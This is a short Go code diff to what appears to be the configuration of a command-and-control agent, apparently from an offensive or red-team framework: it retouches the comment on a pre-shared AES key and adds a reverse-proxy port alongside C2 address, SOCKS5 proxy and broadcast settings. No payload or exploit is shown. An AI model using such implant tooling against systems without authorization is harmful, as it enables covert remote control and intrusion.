@@ -22,7 +22,7 @@ var (
 	// Transport what transport is this agent using? (HTTP2 / CDN / TOR)
 	Transport = fmt.Sprintf("HTTP2 (%s)", CCAddress)
 
-	// AESKey generated from Tag -> md5sum, type: []byte
+	// AESKey preshared []byte AESKey for AES encrypt/decrypt
 	AESKey = tun.GenAESKey("Your Pre Shared AES Key: " + OpSep)
 
 	// HTTPClient handles agent's http communication
@@ -72,6 +72,9 @@ var (
 
 	// ProxyPort start a socks5 proxy to help other agents, on 0.0.0.0:port
 	ProxyPort = "[proxy_port]"
+
+	// ReverseProxyPort for reverse proxy
+	ReverseProxyPort = calculateReverseProxyPort()
 
 	// BroadcastPort port of broadcast server
 	BroadcastPort = "[broadcast_port]"
